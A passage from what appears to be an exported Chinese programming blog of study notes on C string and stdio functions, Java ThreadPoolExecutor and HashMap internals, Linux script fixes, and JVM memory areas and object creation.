class="number">3</span></span><br><span class="line">\tio</span><br></pre></td></tr></table></figure>
<h2 id="strchr">strchr</h2>
<blockquote>
<p>在参数 <strong>str</strong> 所指向的字符串中搜索第一次出现字符 <strong>c</strong>（一个无符号字符）的位置。</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">char</span> *<span class="title">strchr</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str, <span class="type">int</span> c)</span></span></span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>str</strong> – 要查找的字符串。</p>
</li>
<li class="lvl-2">
<p><strong>c</strong> – 要查找的字符。</p>
</li>
<li class="lvl-2">
<p>如果在字符串 str 中找到字符 c，则函数返回指向该字符的指针，如果未找到该字符则返回 NULL。</p>
</li>
</ul>
<h2 id="strrchr">strrchr</h2>
<blockquote>
<p>在参数 <strong>str</strong> 所指向的字符串中搜索最后一次出现字符 <strong>c</strong>（一个无符号字符）的位置。</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">char</span> *<span class="title">strrchr</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str, <span class="type">int</span> c)</span></span></span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>str</strong> – C 字符串。</p>
</li>
<li class="lvl-2">
<p><strong>c</strong> – 要搜索的字符，通常以整数形式传递（ASCII 值），但是最终会转换回 char 形式。</p>
</li>
<li class="lvl-2">
<p>strrchr() 函数从字符串的末尾开始向前搜索，直到找到指定的字符或搜索完整个字符串。如果找到字符，它将返回一个指向该字符的指针，否则返回 NULL。</p>
</li>
</ul>
<h2 id="strcpy">strcpy</h2>
<blockquote>
<p>把 <strong>src</strong> 所指向的字符串复制到 <strong>dest</strong>。需要注意的是如果目标数组 dest 不够大，而源字符串的长度又太长，可能会造成缓冲溢出的情况。</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">char</span> *<span class="title">strcpy</span><span class="params">(<span class="type">char</span> *dest, <span class="type">const</span> <span class="type">char</span> *src)</span></span></span><br></pre></td></tr></table></figure>
<h2 id="strncpy">strncpy</h2>
<blockquote>
<p>把 <strong>src</strong> 所指向的字符串复制到 <strong>dest</strong>，最多复制 <strong>n</strong> 个字符。当 src 的长度小于 n 时，dest 的剩余部分将用空字节填充。</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">char</span> *<span class="title">strcpy</span><span class="params">(<span class="type">char</span> *dest, <span class="type">const</span> <span class="type">char</span> *src)</span></span></span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>dest</strong> – 指向用于存储复制内容的目标数组。</p>
</li>
<li class="lvl-2">
<p><strong>src</strong> – 要复制的字符串。</p>
</li>
<li class="lvl-2">
<p><strong>n</strong> – 要从源中复制的字符数。</p>
</li>
<li class="lvl-2">
<p>该函数返回最终复制的字符串。</p>
</li>
</ul>
<h2 id="stdio-h">stdio.h</h2>
<h2 id="flush">flush</h2>
<blockquote>
<p>刷新流 stream 的输出缓冲区，将缓冲区中的内容写到stream所指的文件中区</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">fflush</span><span class="params">(FILE *stream)</span></span></span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>stream</strong> – 这是指向 FILE 对象的指针，该 FILE 对象指定了一个缓冲流</p>
</li>
<li class="lvl-2">
<p>如果成功，该函数返回零值。如果发生错误，则返回 EOF，且设置错误标识符（即 feof）。</p>
</li>
</ul>
<p><a href="https://blog.csdn.net/ShenHang_/article/details/114968557">fflush()函数-CSDN博客</a></p>
<h2 id="snprintf">snprintf</h2>
<blockquote>
<p>用于格式化输出字符串，并将结果写入到指定的缓冲区，与 sprintf() 不同的是，snprintf() 会限制输出的字符数，避免缓冲区溢出。将可变参数**(…)**按照 <strong>format</strong> 格式化成字符串，并将字符串复制到 <strong>str</strong> 中，<strong>size</strong> 为要写入的字符的最大数目，超过 <strong>size</strong> 会被截断，最多写入 size-1 个字符，并在字符串的末尾添加一个空字符（\0）以表示字符串的结束。</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">snprintf</span> <span class="params">( <span class="type">char</span> * str, <span class="type">size_t</span> size, <span class="type">const</span> <span class="type">char</span> * format, ... )</span></span>;</span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>str</strong> – 目标字符串，用于存储格式化后的字符串的字符数组的指针。</p>
</li>
<li class="lvl-2">
<p><strong>size</strong> – 字符数组的大小。</p>
</li>
<li class="lvl-2">
<p><strong>format</strong> – 格式化字符串。</p>
</li>
<li class="lvl-2">
<p><strong>…</strong> – 可变参数，可变数量的参数根据 format 中的格式化指令进行格式化。</p>
</li>
<li class="lvl-2">
<p>snprintf() 函数的返回值是输出到 str 缓冲区中的字符数，不包括字符串结尾的空字符 \0。</p>
</li>
</ul>
<h2 id="stat">stat</h2>
<blockquote>
<p>获取文件状态</p>
</blockquote>
<p><a href="https://www.cnblogs.com/jikexianfeng/p/5742887.html">C语言stat()函数：获取文件状态 - 极客先锋 - 博客园 (cnblogs.com)</a></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/stat.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;uninstd.h&gt;</span></span></span><br><span class="line"><span class="comment">//将参数file_name 所指的文件状态, 复制到参数buf 所指的结构中。</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">stat</span><span class="params">(<span class="type">const</span> <span class="type">char</span> * file_name, <span class="keyword">struct</span> stat *buf)</span></span></span><br><span class="line"><span class="function"><span class="keyword">struct</span> stat </span>&#123;</span><br><span class="line">    <span class="type">dev_t</span> st_dev; <span class="comment">//device 文件的设备编号</span></span><br><span class="line">    <span class="type">ino_t</span> st_ino; <span class="comment">//inode 文件的i-node</span></span><br><span class="line">    <span class="type">mode_t</span> st_mode; <span class="comment">//protection 文件的类型和存取的权限</span></span><br><span class="line">    <span class="type">nlink_t</span> st_nlink; <span class="comment">//number of hard links 连到该文件的硬连接数目, 刚建立的文件值为1.</span></span><br><span class="line">    <span class="type">uid_t</span> st_uid; <span class="comment">//user ID of owner 文件所有者的用户识别码</span></span><br><span class="line">    <span class="type">gid_t</span> st_gid; <span class="comment">//group ID of owner 文件所有者的组识别码</span></span><br><span class="line">    <span class="type">dev_t</span> st_rdev; <span class="comment">//device type 若此文件为装置设备文件, 则为其设备编号</span></span><br><span class="line">    <span class="type">off_t</span> st_size; <span class="comment">//total size, in bytes 文件大小, 以字节计算</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> st_blksize; <span class="comment">//blocksize for filesystem I/O 文件系统的I/O 缓冲区大小.</span></span><br><span class="line">    u nsigned <span class="type">long</span> st_blocks; <span class="comment">//number of blocks allocated 占用文件区块的个数, 每一区块大小为512 个字节.</span></span><br><span class="line">    <span class="type">time_t</span> st_atime; <span class="comment">//time of lastaccess 文件最近一次被存取或被执行的时间, 一般只有在用mknod、 utime、read、write 与tructate 时改变.</span></span><br><span class="line">    <span class="type">time_t</span> st_mtime; <span class="comment">//time of last modification 文件最后一次被修改的时间, 一般只有在用mknod、 utime 和write 时才会改变</span></span><br><span class="line">    <span class="type">time_t</span> st_ctime; <span class="comment">//time of last change i-node 最近一次被更改的时间, 此参数会在文件所有者、组、 权限被更改时更新</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h1>函数参数处理</h1>
<h2 id="va-start">va_start</h2>
<blockquote>
<p>初始化 <strong>ap</strong> 变量，它与 <strong>va_arg</strong> 和 <strong>va_end</strong> 宏是一起使用的。<strong>last_arg</strong> 是最后一个传递给函数的已知的固定参数，即省略号之前的参数。</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">va_start</span><span class="params">(va_list ap, last_arg)</span></span>;</span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>ap</strong> – 这是一个 <strong>va_list</strong> 类型的对象，它用来存储通过 <strong>va_arg</strong> 获取额外参数时所必需的信息。</p>
</li>
<li class="lvl-2">
<p><strong>last_arg</strong> – 最后一个传递给函数的已知的固定参数。</p>
</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//sum(3,10,20,30)</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">sum</span><span class="params">(<span class="type">int</span> num_args, ...)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="type">int</span> val = <span class="number">0</span>;</span><br><span class="line">   va_list ap;</span><br><span class="line">   <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">   <span class="built_in">va_start</span>(ap, num_args);</span><br><span class="line">   <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; num_args; i++)</span><br><span class="line">   &#123;</span><br><span class="line">      val += <span class="built_in">va_arg</span>(ap, <span class="type">int</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="built_in">va_end</span>(ap);</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="vsnprintf">vsnprintf</h2>
<p><a href="https://blog.csdn.net/u012351051/article/details/106414950">sprintf、snprintf、vsprintf、vsnprintf格式化函数分析_c++ sprintf vsprintf详解-CSDN博客</a></p>
<blockquote>
<p>使用参数列表发送格式化输出到字符串</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">vsnprintf</span><span class="params">(<span class="type">char</span> *str, <span class="type">size_t</span> size, <span class="type">const</span> <span class="type">char</span> *format, va_list ap)</span></span>;</span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p>str – 目标字符串。</p>
</li>
<li class="lvl-2">
<p>size – 最大格式化的字符长度。</p>
</li>
<li class="lvl-2">
<p>format – 格式化模式</p>
</li>
<li class="lvl-2">
<p>arg – 可变参数列表对象，应由&lt;stdarg&gt;中定义的va_start 宏初始化。</p>
</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2024/03/05/Java/%E6%BA%90%E7%A0%81/Java%E5%B9%B6%E5%8F%91%EF%BC%9AThreadPoolExecutor/</url>
    <content><![CDATA[<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**  </span></span><br><span class="line"><span class="comment"> * Executes the given task sometime in the future.  The task * may execute in a new thread or in an existing pooled thread. * * If the task cannot be submitted for execution, either because this * executor has been shutdown or because its capacity has been reached, * the task is handled by the current &#123;<span class="doctag">@code</span> RejectedExecutionHandler&#125;.  </span></span><br><span class="line"><span class="comment"> * * <span class="doctag">@param</span> command the task to execute  </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> RejectedExecutionException at discretion of  </span></span><br><span class="line"><span class="comment"> *         &#123;<span class="doctag">@code</span> RejectedExecutionHandler&#125;, if the task  </span></span><br><span class="line"><span class="comment"> *         cannot be accepted for execution * <span class="doctag">@throws</span> NullPointerException if &#123;<span class="doctag">@code</span> command&#125; is null  </span></span><br><span class="line"><span class="comment"> */</span><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">execute</span><span class="params">(Runnable command)</span> &#123;  </span><br><span class="line">    <span class="keyword">if</span> (command == <span class="literal">null</span>)  </span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>();  </span><br><span class="line">    <span class="comment">/*  </span></span><br><span class="line"><span class="comment">     * Proceed in 3 steps:     *     * 1. If fewer than corePoolSize threads are running, try to     * start a new thread with the given command as its first     * task.  The call to addWorker atomically checks runState and     * workerCount, and so prevents false alarms that would add     * threads when it shouldn&#x27;t, by returning false.     *     * 2. If a task can be successfully queued, then we still need     * to double-check whether we should have added a thread     * (because existing ones died since last checking) or that     * the pool shut down since entry into this method. So we     * recheck state and if necessary roll back the enqueuing if     * stopped, or start a new thread if there are none.     *     * 3. If we cannot queue task, then we try to add a new     * thread.  If it fails, we know we are shut down or saturated     * and so reject the task.     */</span>    </span><br><span class="line">    <span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span> ctl.get();  </span><br><span class="line">    <span class="keyword">if</span> (workerCountOf(c) &lt; corePoolSize) &#123;  </span><br><span class="line">        <span class="keyword">if</span> (addWorker(command, <span class="literal">true</span>))  </span><br><span class="line">            <span class="keyword">return</span>;  </span><br><span class="line">        c = ctl.get();  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">if</span> (isRunning(c) &amp;&amp; workQueue.offer(command)) &#123;  </span><br><span class="line">        <span class="type">int</span> <span class="variable">recheck</span> <span class="operator">=</span> ctl.get();  </span><br><span class="line">        <span class="keyword">if</span> (! isRunning(recheck) &amp;&amp; remove(command))  </span><br><span class="line">            reject(command);  </span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (workerCountOf(recheck) == <span class="number">0</span>)  </span><br><span class="line">            addWorker(<span class="literal">null</span>, <span class="literal">false</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!addWorker(command, <span class="literal">false</span>))  </span><br><span class="line">        reject(command);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><a href="https://www.throwx.cn/2020/08/23/java-concurrency-thread-pool-executor/">硬核干货：4W字从源码上分析JUC线程池ThreadPoolExecutor的实现原理 | Throwable (throwx.cn)</a></p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2023/10/12/%E8%AF%AD%E6%B3%95/Linux/</url>
    <content><![CDATA[<h1>linux</h1>
<h2 id="bug">bug</h2>
<ol>
<li class="lvl-3">
<p>Linux执行.sh文件，提示No such file or directory的问题的解决方法</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">fileformat格式错误</span></span><br><span class="line">vim打开sh文件</span><br><span class="line">:set ff(fileformat=dos)</span><br><span class="line">:set ff=unix</span><br><span class="line">:wq</span><br></pre></td></tr></table></figure>
</li>
<li class="lvl-3">
<p>Command ‘clang’ not found, but can be installed with</p>
<p>[Fixing ‘clang’ and ‘clang++’ not found after installing ‘clang-3.5’ package | DeviceTests](<a href="https://devicetests.com/fixing-clang-and-clang-not-found#:~:text=Open">https://devicetests.com/fixing-clang-and-clang-not-found#:~:text=Open</a> a terminal and run the following command%3A,the repository%2C and installs it on your system.)</p>
</li>
</ol>
<h1>Cmake</h1>
<h2 id="设置cmake编译器">设置cmake编译器</h2>
<p><a href="https://blog.csdn.net/weixin_39766005/article/details/122435780">CMake I 获取/设置编译器_cmake_cxx_compiler_id-CSDN博客</a></p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2024/06/11/Java/%E6%BA%90%E7%A0%81/HashMap%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1>1 HashMap</h1>
<p>HashMap 主要用来存放键值对，它基于哈希表的 Map 接口实现，是常用的 Java 集合之一，是<strong>非线程安全的</strong>。</p>
<p><code>HashMap</code> 可以存储 null 的 key 和 value，但 null 作为键只能有一个，null 作为值可以有多个</p>
<p>JDK1.8 之前 HashMap 由 数组+链表 组成的，数组是 HashMap 的主体，链表则是主要为了解决哈希冲突而存在的（“拉链法”解决冲突）。 JDK1.8 以后的 <code>HashMap</code> 在解决哈希冲突时有了较大的变化，当链表长度大于等于阈值（默认为 8）（将链表转换成红黑树前会判断，如果当前数组的长度小于 64，那么会选择先进行数组扩容，而不是转换为红黑树）时，将链表转化为红黑树，以减少搜索时间。</p>
<p><code>HashMap</code> 默认的初始化大小为 16。之后每次扩充，容量变为原来的 2 倍。并且， <code>HashMap</code> 总是使用 2 的幂作为哈希表的大小。</p>
<h1>2 底层数据结构</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>loadFactor 负载因子</strong><br>
loadFactor 负载因子是控制数组存放数据的疏密程度，loadFactor 越趋近于 1，那么 数组中存放的数据(entry)也就越多，也就越密，也就是会让链表的长度增加，loadFactor 越小，也就是趋近于 0，数组中存放的数据(entry)也就越少，也就越稀疏。</p>
<p><strong>loadFactor 太大导致查找元素效率低，太小导致数组的利用率低，存放的数据会很分散。loadFactor 的默认值为 0.75f 是官方给出的一个比较好的临界值</strong>。</p>
<p>给定的默认容量为 16，负载因子为 0.75。Map 在使用过程中不断的往里面存放数据，当数量超过了 16 * 0.75 = 12 就需要将当前 16 的容量进行扩容，而扩容这个过程涉及到 rehash、复制数据等操作，所以非常消耗性能。</p>
</li>
<li class="lvl-2">
<p><strong>threshold</strong></p>
<p><strong>threshold = capacity * loadFactor</strong>，<strong>当 Size&gt;threshold</strong>的时候，那么就要考虑对数组的扩增了，也就是说，这个的意思就是 <strong>衡量数组是否需要扩增的一个标准</strong>。</p>
</li>
</ul>
<h1>3 HashMap源码分析</h1>
]]></content>
  </entry>
  <entry>
    <title>JVM (1)：内存区域划分、类加载机制</title>
    <url>/2024/04/01/%E6%A1%86%E6%9E%B6/JVM/JVM%20(1)%EF%BC%9A%E5%86%85%E5%AD%98%E5%8C%BA%E5%9F%9F%E5%88%92%E5%88%86%E3%80%81%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/</url>
    <content><![CDATA[<h1>1 内存区域划分</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p>程序计数器：当前线程所执行的字节码的行号指示器，记录当前线程执行的位置，线程切换后能恢复到正确的执行位置</p>
</li>
<li class="lvl-2">
<p>虚拟机栈：每个 Java 方法在执行之前会创建一个栈帧用于存储局部变量表、操作数栈、常量池引用、方法出口等信息。</p>
</li>
<li class="lvl-2">
<p>本地方法栈：与虚拟机栈类似，区别是虚拟机栈执行java方法，本地方法站执行native方法。</p>
</li>
<li class="lvl-2">
<p>堆：用于存放新创建的对象 (几乎所有对象都在这里分配内存)，当申请不到空间时会抛出 OutOfMemoryError。</p>
</li>
<li class="lvl-2">
<p>方法区(元空间、永久代)：主要用于存放已被加载的类信息、常量、静态变量、即时编译器编译后的代码等数据。</p>
</li>
<li class="lvl-2">
<p>直接内存：</p>
</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202404082249131.png" alt="image.png"></p>
<blockquote>
<p>[! question] 永久代替换成元空间</p>
<ul class="lvl-1">
<li class="lvl-2">永久代有一个 JVM 本身设置的固定大小上限，无法进行调整（也就是受到 JVM 内存的限制），而<strong>元空间使用的是本地内存，受本机可用内存的限制</strong>，虽然元空间仍旧可能溢出，但是比原来出现的几率会更小</li>
<li class="lvl-2">元空间里面存放的是类的元数据，这样加载多少类的元数据就不由 <code>MaxPermSize</code> 控制了, 而由系统的实际可用空间来控制，这样能加载的类就更多了</li>
<li class="lvl-2"><strong>永久代会为 GC 带来不必要的复杂度</strong>，并且<strong>回收效率偏低</strong></li>
</ul>
</blockquote>
<p>字符串创建：<br>
<a href="https://blog.csdn.net/yuiop123455/article/details/107242285">String创建字符串的几种方式，以及在内存中的情况(JAVA)_string[] str = new string[3]能创建字符串吗-CSDN博客</a></p>
<h2 id="1-1-线程私有">1.1 线程私有</h2>
<h3 id="1-1-1-程序计数器">1.1.1 程序计数器</h3>
<blockquote>
<p>程序计数器(Program Counter Register) 是一块较小的内存空间，它的作用可以看做是当前线程所执行的字节码的行号指示器。字节码解释器工作时就是通过改变这个计数器的值来选取下一条需要执行的字节码指令，分支、循环、跳转、异常处理、线程恢复等基础功能都需要依赖这个计数器来完成。</p>
</blockquote>
<h3 id="1-1-2-虚拟机栈">1.1.2 虚拟机栈</h3>
<p>虚拟机栈描述的是<strong>Java 方法</strong>执行的内存模型：每个方法被执行的时候都会同时创建一个栈帧(Stack Frame) 用于存储局部变量表、操作栈、动态链接、方法出口等信息。</p>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202405211009672.png" alt="image.png|251"><br>
<strong>动态链接</strong> 主要服务一个方法需要调用其他方法的场景。Class 文件的常量池里保存有大量的符号引用比如方法引用的符号引用。当一个方法要调用其他方法，需要将常量池中指向方法的符号引用转化为其在内存地址中的直接引用。动态链接的作用就是为了将符号引用转换为调用方法的直接引用，这个过程也被称为 <strong>动态连接</strong> 。</p>
<h3 id="1-1-3-本地方法栈">1.1.3 本地方法栈</h3>
<blockquote>
<p><strong>虚拟机栈为虚拟机执行 Java 方法 （也就是字节码）服务，而本地方法栈则为虚拟机使用到的 Native 方法服务。</strong></p>
</blockquote>
<p>一个Native Method就是一个<strong>java调用非java代码</strong>的接口。一个Native Method是这样一个java的方法：该方法是一个原生态方法，方法对应的实现不是在当前文件，而是在用其他语言（如C和C++）实现的文件中。标识符native可以与所有其它的java标识符连用，但是abstract除外。这是因为native暗示这些方法是有实现体的，只不过这些实现体是非java的，但是abstract却显然的指明这些方法无实现体。<br>
<a href="https://zhuanlan.zhihu.com/p/24054609">Java学习之——理解Native关键字 - 知乎 (zhihu.com)</a></p>
<h2 id="1-2-线程共享">1.2 线程共享</h2>
<p>java6及之前字符串常量池才在方法区（永久代）吧，之后字符串常量池在堆（新生代/老年代）</p>
<h3 id="1-2-1-堆空间">1.2.1 堆空间</h3>
<p>堆空间是JVM中用于<em>存储对象实例</em>的区域，它通常被划分为新生代和老年代两个主要部分，其中新生代又包括Eden区和两个Survivor区。<strong>此内存区域的唯一目的就是存放对象实例，几乎所有的对象实例以及数组都在这里分配内存。</strong></p>
<p>Java 堆是垃圾收集器管理的主要区域，因此也被称作 <strong>GC 堆（Garbage Collected Heap）</strong>。堆内存被分为三部分：</p>
<ol>
<li class="lvl-3">
<p>新生代内存(Young Generation)，新生代包括Eden区、两个Survivor区S0和S1</p>
</li>
<li class="lvl-3">
<p>老生代(Old Generation)</p>
</li>
<li class="lvl-3">
<p>永久代(Permanent Generation)<br>
<strong>JDK 8 版本之后 PermGen(永久代) 已被 Metaspace(元空间) 取代，元空间使用的是本地内存。</strong></p>
</li>
</ol>
<blockquote>
<p>年龄为0-15？因为记录年龄的区域在对象头中，这个区域的大小通常是 4 位。这 4 位可以表示的最大二进制数字是 1111，即十进制的 15。因此，对象的年龄被限制为 0 到 15。</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202404072245762.png" alt="image.png"></p>
<p>分配策略:1.对象优先在Eden区分配 2.大对象直接进入老年代 3.长期存活的对象将进入老年代 4.动态对象年龄判定 5.空间分配担保等</p>
<p>字符串常量池：<strong>字符串常量池</strong> 是 JVM 为了提升性能和减少内存消耗针对字符串（String 类）专门开辟的一块区域，主要目的是为了避免字符串的重复创建。</p>
<h3 id="1-2-2-方法区">1.2.2 方法区</h3>
<blockquote>
<p>当虚拟机要使用一个类时，它需要读取并解析 Class 文件获取相关信息，再将信息存入到方法区。方法区会存储已被虚拟机加载的 <strong>类信息、字段信息、方法信息、常量、静态变量、即时编译器编译后的代码缓存等数据</strong>。</p>
</blockquote>
<p>运行时常量池：Class 文件中除了有类的版本、字段、方法、接口等描述信息外，还有用于存放编译期生成的各种字面量（Literal）和符号引用（Symbolic Reference）的 <strong>常量池表(Constant Pool Table)</strong> 。</p>
<h4 id="运行时常量池">运行时常量池</h4>
<p>Class 文件中除了有类的版本、字段、方法、接口等描述信息外，还有用于存放编译期生成的各种字面量（Literal）和符号引用（Symbolic Reference）的 <strong>常量池表(Constant Pool Table)</strong> 。</p>
<p>字面量是源代码中的固定值的表示法，即通过字面我们就能知道其值的含义。字面量包括整数、浮点数和字符串字面量。常见的符号引用包括类符号引用、字段符号引用、方法符号引用、接口方法符号。</p>
<p>常量池表会在类加载后存放到方法区的运行时常量池中。</p>
<p>运行时常量池的功能类似于传统编程语言的符号表，尽管它包含了比典型符号表更广泛的数据。</p>
<p>既然运行时常量池是方法区的一部分，自然受到方法区内存的限制，当常量池无法再申请到内存时会抛出 <code>OutOfMemoryError</code> 错误。</p>
<h4 id="字符串常量池">字符串常量池</h4>
<p><strong>字符串常量池</strong> 是 JVM 为了提升性能和减少内存消耗针对字符串（String 类）专门开辟的一块区域，主要目的是为了避免字符串的重复创建。</p>
<p>JDK1.7 之前，字符串常量池存放在永久代。JDK1.7 字符串常量池和静态变量从永久代移动了 Java 堆中。</p>
<h4 id="方法区内容">方法区内容</h4>
<p>用于存储已被虚拟机加载的<strong>类型信息、常量、静态变量、即时编译器编译后的代码缓存</strong>等。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>类信息：包括类的结构信息、类的访问修饰符、父类与接口等信息。</p>
</li>
<li class="lvl-2">
<p>常量池：存储类和接口中的常量，包括字面值常量、符号引用，以及运行时常量池。</p>
</li>
<li class="lvl-2">
<p>静态变量：存储类的静态变量，这些变量在类初始化的时候被赋值。</p>
</li>
<li class="lvl-2">
<p>方法字节码：存储类的方法字节码，即编译后的代码。</p>
</li>
<li class="lvl-2">
<p>符号引用：存储类和方法的符号引用，是一种直接引用不同于直接引用的引用类型。</p>
</li>
<li class="lvl-2">
<p>运行时常量池：存储着在类文件中的常量池数据，在类加载后在方法区生成该运行时常量池。</p>
</li>
<li class="lvl-2">
<p>常量池缓存：用于提升类加载的效率，将常用的常量缓存起来方便使用。</p>
</li>
</ul>
<h3 id="1-2-3-直接内存">1.2.3 直接内存</h3>
<p>直接内存是一种特殊的内存缓冲区，并不在 Java 堆或方法区中分配的，而是通过 JNI 的方式在本地内存上分配的。</p>
<p>直接内存并不是虚拟机运行时数据区的一部分，也不是虚拟机规范中定义的内存区域，但是这部分内存也被频繁地使用。而且也可能导致 <code>OutOfMemoryError</code> 错误出现。</p>
<h1>2 内存泄露和内存溢出</h1>
<p><strong>内存泄露</strong>：内存泄漏是指程序在运行过程中不再使用的对象仍然被引用，而无法被垃圾收集器回收，从而导致可用内存逐渐减少。</p>
<p>内存泄露常见原因：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>静态集合：使用静态数据结构（如HashMap或ArrayList）存储对象，且未清理。</p>
</li>
<li class="lvl-2">
<p>事件监听：未取消对事件源的监听，导致对象持续被引用。</p>
</li>
<li class="lvl-2">
<p>线程：未停止的线程可能持有对象引用，无法被回收。</p>
</li>
</ul>
<p>内存溢出：内存溢出是指Java虚拟机（JVM）在申请内存时，无法找到足够的内存，最终引发OutOfMemoryError。这通常发生在堆内存不足以存放新创建的对象时。</p>
<p>内存溢出常见原因：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>大量对象创建：程序中不断创建大量对象，超出JVM堆的限制。</p>
</li>
<li class="lvl-2">
<p>持久引用：大型数据结构（如缓存、集合等）长时间持有对象引用，导致内存累积。</p>
</li>
<li class="lvl-2">
<p>递归调用：深度递归导致栈溢出。</p>
</li>
</ul>
<h2 id="2-1-内存溢出情况">2.1 内存溢出情况</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p>堆内存溢出：代码中存在大对象分配，或者发生了内存泄露</p>
</li>
<li class="lvl-2">
<p>栈溢出：不断进行递归调用，没有退出条件。<code>StackOverFlowError</code></p>
</li>
<li class="lvl-2">
<p>元空间溢出：出现这个异常的问题的原因是系统的代码非常多或引用的第三方包非常多或者通过动态代码生成类加载等方法，导致元空间的内存占用很大。</p>
</li>
<li class="lvl-2">
<p>直接内存溢出：在使用ByteBuffer中的allocateDirect()的时候会用到，很多javaNIO(像netty)的框架中被封装为其他的方法，出现该问题时会抛出java.lang.OutOfMemoryError: Direct buffer memory异常。</p>
</li>
</ul>
<h1>3 对象创建</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>类加载检查</code>：虚拟机遇到一条 new 指令时，首先将去检查这个指令的参数是否能在常量池中定位到这个类的符号引用，并且检查这个符号引用代表的类是否已被加载过、解析和初始化过。如果没有，那必须先执行相应的类加载过程。</p>
</li>
<li class="lvl-2">
<p><code>分配内存</code>：在<strong>类加载检查</strong>通过后，接下来虚拟机将为新生对象<strong>分配内存</strong>。对象所需的内存大小在类加载完成后便可确定，为对象分配空间的任务等同于把一块确定大小的内存从 Java 堆中划分出来。</p>
</li>
<li class="lvl-2">
<p><code>初始化零值</code>：内存分配完成后，虚拟机需要将分配到的内存空间都初始化为零值（不包括对象头），这一步操作保证了对象的实例字段在 Java 代码中可以不赋初始值就直接使用，程序能访问到这些字段的数据类型所对应的零值。</p>
</li>
<li class="lvl-2">
<p><code>设置对象头</code>：初始化零值完成之后，<strong>虚拟机要对对象进行必要的设置</strong>，例如这个对象是哪个类的实例、如何才能找到类的元数据信息、对象的哈希码、对象的 GC 分代年龄等信息。 <strong>这些信息存放在对象头中。</strong> 另外，根据虚拟机当前运行状态的不同，如是否启用偏向锁等，对象头会有不同的设置方式。</p>
</li>
<li class="lvl-2">
<p><code>执行 init 方法</code>：在上面工作都完成之后，从虚拟机的视角来看，一个新的对象已经产生了，但从 Java 程序的视角来看，对象创建才刚开始，<code>init</code> 方法还没有执行，所有的字段都还为零。所以一般来说，执行 new 指令之后会接着执行 <code>init</code> 方法，把对象按照程序员的意愿进行初始化，这样一个真正可用的对象才算完全产生出来。</p>
</li>
</ul>
